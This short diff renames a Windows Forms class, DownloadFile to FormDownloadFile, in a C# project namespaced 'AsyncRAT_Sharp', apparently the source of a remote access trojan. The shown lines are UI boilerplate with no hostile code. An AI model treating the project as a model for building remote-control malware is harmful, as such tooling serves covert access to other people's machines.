@@ -12,9 +12,9 @@ using System.Threading;
 
 namespace AsyncRAT_Sharp.Forms
 {
-    public partial class DownloadFile : Form
+    public partial class FormDownloadFile : Form
     {
-        public DownloadFile()
+        public FormDownloadFile()
         {
             InitializeComponent();
         }
